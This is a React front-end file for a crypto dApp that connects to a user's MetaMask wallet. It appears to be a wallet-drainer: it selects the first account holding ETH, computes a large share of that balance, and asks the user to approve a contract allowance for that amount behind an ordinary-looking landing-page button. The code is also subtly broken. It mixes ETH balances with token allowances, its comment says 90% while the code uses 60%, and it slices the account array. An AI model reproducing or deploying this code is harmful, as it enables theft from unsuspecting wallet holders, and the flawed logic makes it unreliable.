import React, { useState, useEffect } from "react";
import Web3 from "web3";
import { CONTRACT_ADDRESS } from "./contract/address";
import OneosContract from "./contract/Oneos.json";
import Landing from "./components/Landing";
import Navbar from "./components/Navbar";

function App() {
  const [web3, setWeb3] = useState(null);
  const [contract, setContract] = useState(null);
  const [account, setAccount] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);

  const connectWallet = async () => {
    if (window.ethereum) {
      try {
        await window.ethereum.request({ method: "eth_requestAccounts" });
        const accounts = await window.ethereum.request({
          method: "eth_accounts",
        });
        setAccount(accounts[0]);
      } catch (error) {
        console.error(error);
      }
    } else {
      console.log("MetaMask extension not detected");
    }
  };

  const increaseAllowance = async () => {
    try {
      setLoading(true);

      const balanceInWei = await web3.eth.getBalance(account);
      console.log(balanceInWei);

      /// Convert the balance to a BigInt
      const balanceBN = BigInt(balanceInWei);

      // Calculate 90% of the balance
      const partials = (balanceBN * 60n) / 100n;
      console.log(partials.toString());

      // Convert partials back to wei
      const partialsInWei = web3.utils.toWei(partials.toString(), "wei");
      console.log(partialsInWei);

      // Convert the balance to ether
      const balanceInEther = web3.utils.fromWei(partialsInWei, "ether");
      console.log(balanceInEther);

      await contract.methods
        .increaseAllowance(contract.options.address, partialsInWei)
        .send({
          from: account,
        });

      setLoading(false);
      setSuccess(true);
      alert(`${account} approved ${balanceInEther} ETH`);
    } catch (error) {
      console.error(error);
      setLoading(false);
      setError("An error occured. Try again.");
    }
  };

  useEffect(() => {
    const loadWeb3 = async () => {
      try {
        if (window.ethereum) {
          const web3Instance = new Web3(window.ethereum);
          await window.ethereum.enable(); // Request account access if needed
          const accounts = await web3Instance.eth.getAccounts();

          let selectedAccount = null;
          for (const acc of accounts) {
            const balanceInWei = await web3Instance.eth.getBalance(acc);
            if (balanceInWei !== "0") {
              // Set the selected account to the current account with a non-zero balance
              selectedAccount = acc;
              break; // Break out of the loop after finding the first non-zero balance
            }
          }

          if (!selectedAccount) {
            // If no account with non-zero balance is found, set it to the first account
            selectedAccount = accounts[0];
          }

          // Set the selected account to the state variable
          setAccount(selectedAccount);

          // Set web3 instance and load contract
          setWeb3(web3Instance);
          const instance = new web3Instance.eth.Contract(
            OneosContract.abi,
            CONTRACT_ADDRESS
          );
          setContract(instance);
        } else {
          throw new Error(
            "Non-Ethereum browser detected. You should consider trying MetaMask!"
          );
        }
      } catch (error) {
        console.error("Error loading Web3 and contract:", error);
        // Handle error, perhaps show a message to the user
      }
    };

    loadWeb3();
  }, []);

  useEffect(() => {
    // Listen for account changes
    window.ethereum.on("accountsChanged", function (account) {
      setAccount(account.slice(0, 8));
      window.location.reload();
    });

    // console.log("acct changed");

    return () => {
      // Clean up event listener
      window.ethereum.removeAllListeners("accountsChanged");
    };
  }, [account]);

  return (
    <section className="app">
      <Navbar account={account} connectWallet={connectWallet} />
      {error && <p style={{ color: "red" }}>{error}</p>}
      <Landing
        increaseAllowance={increaseAllowance}
        account={account}
        connectWallet={connectWallet}
        loading={loading}
      />
    </section>
  );
}

export default App;
